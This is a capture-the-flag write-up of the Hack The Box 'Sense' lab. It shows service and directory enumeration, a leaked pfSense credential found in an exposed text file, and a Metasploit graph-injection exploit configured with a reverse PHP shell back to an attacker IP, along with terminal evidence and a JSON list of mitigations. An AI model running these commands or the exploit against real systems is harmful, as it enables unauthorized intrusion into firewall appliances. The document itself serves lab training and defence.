# HTB Sense - pfSense Credential Discovery and Graph Injection RCE

Scope: authorized HTB lab only.
Focus: web interface enumeration, credential artifact discovery, and authenticated pfSense command execution exploit path.

---

## 1. Investigation Objective

1. Identify exposed network services and management portal.
2. Enumerate web content for leaked credentials.
3. Verify pfSense version and match known exploit path.
4. Validate remote command execution under authenticated context.

---

## 2. Recon and Web Surface Mapping

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Observed in common Sense path:
- 80/tcp HTTP
- 443/tcp HTTPS (`lighttpd 1.4.35`)

Portal identification:
- target hosts pfSense login interface.

---

## 3. Directory Enumeration and Credential Artifact

```bash
gobuster dir -u https://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,conf,php -k -t 200
```

Key discovery:
- `system-users.txt` exposed via web path.

Recovered credential candidate:
- `rohit : pfsense`

Login outcome:
- web authentication successful with recovered account.

---

## 4. Version Validation and Exploit Mapping

After login, installed version observed:
- `pfSense 2.1.3-RELEASE`

Exploit intelligence:

```bash
searchsploit pfsense 2.1.3
```

Selected path:
- `exploit/unix/http/pfsense_graph_injection_exec` (authenticated RCE workflow).

---

## 5. Exploitation Workflow (Metasploit)

```text
msfconsole
msf6 > use exploit/unix/http/pfsense_graph_injection_exec
msf6 exploit(...) > set RHOSTS <TARGET_IP>
msf6 exploit(...) > set USERNAME rohit
msf6 exploit(...) > set PASSWORD pfsense
msf6 exploit(...) > set LHOST <ATTACKER_TUN0_IP>
msf6 exploit(...) > set PAYLOAD php/reverse_php
msf6 exploit(...) > run
```

Expected result:
- reverse shell/session returned from target.

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.10.10.60
PORT    STATE SERVICE VERSION
80/tcp  open  http    lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35

analyst@kali:~$ gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,conf,php -k -t 200
/system-users.txt (Status: 200)

Browser evidence:
system-users.txt -> rohit:pfsense
pfSense dashboard -> version 2.1.3-RELEASE

analyst@kali:~$ searchsploit pfsense 2.1.3
pfSense <= 2.1.3 - Remote Command Execution ...

msf6 > use exploit/unix/http/pfsense_graph_injection_exec
msf6 exploit(...) > set RHOSTS 10.10.10.60
msf6 exploit(...) > set USERNAME rohit
msf6 exploit(...) > set PASSWORD pfsense
msf6 exploit(...) > set LHOST 10.10.14.6
msf6 exploit(...) > run
[+] Meterpreter/session opened
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "sense_pfsense_credential_leak_to_authenticated_rce",
	"input_signals": [
		"HTTPS management interface identified as pfSense",
		"Directory brute-force exposed system-users.txt",
		"Recovered credential allowed dashboard login",
		"Installed version matched known graph injection exploit",
		"Metasploit module produced remote session"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service and Content Discovery",
			"confidence": 0.94,
			"evidence": "nmap and gobuster mapped portal and exposed files"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Credentials in Files",
			"confidence": 0.91,
			"evidence": "rohit:pfsense recovered from system-users.txt"
		},
		{
			"step": 3,
			"tactic": "execution",
			"technique": "Exploitation for Remote Command Execution",
			"confidence": 0.89,
			"evidence": "authenticated graph injection module succeeded"
		}
	],
	"hypotheses": [
		"Credential hygiene issues may affect other infrastructure accounts",
		"Management interfaces may be internet-exposed in multiple environments",
		"Patch lag likely extends beyond the firewall appliance"
	],
	"uncertainties": [
		"Unknown if account had MFA or IP restrictions in production-like settings",
		"No confirmation of IDS/WAF signature coverage for exploit traffic",
		"Scope of post-compromise access not fully enumerated"
	],
	"tool_calls": [
		{"name": "management_portal_exposure_audit", "priority": "high"},
		{"name": "web_secret_file_scanner", "priority": "high"},
		{"name": "pfsense_patch_gap_analyzer", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Remove publicly accessible credential files",
			"Reset exposed pfSense user credentials",
			"Restrict management portal access to trusted admin networks"
		],
		"hardening": [
			"Upgrade pfSense to supported and patched versions",
			"Enforce strong authentication and MFA for admin roles",
			"Disable unnecessary web-exposed management endpoints"
		],
		"monitoring": [
			"Alert on repeated portal login attempts and new admin sessions",
			"Monitor unusual command execution patterns on firewall appliance",
			"Track access to sensitive text/config endpoints"
		]
	}
}
```

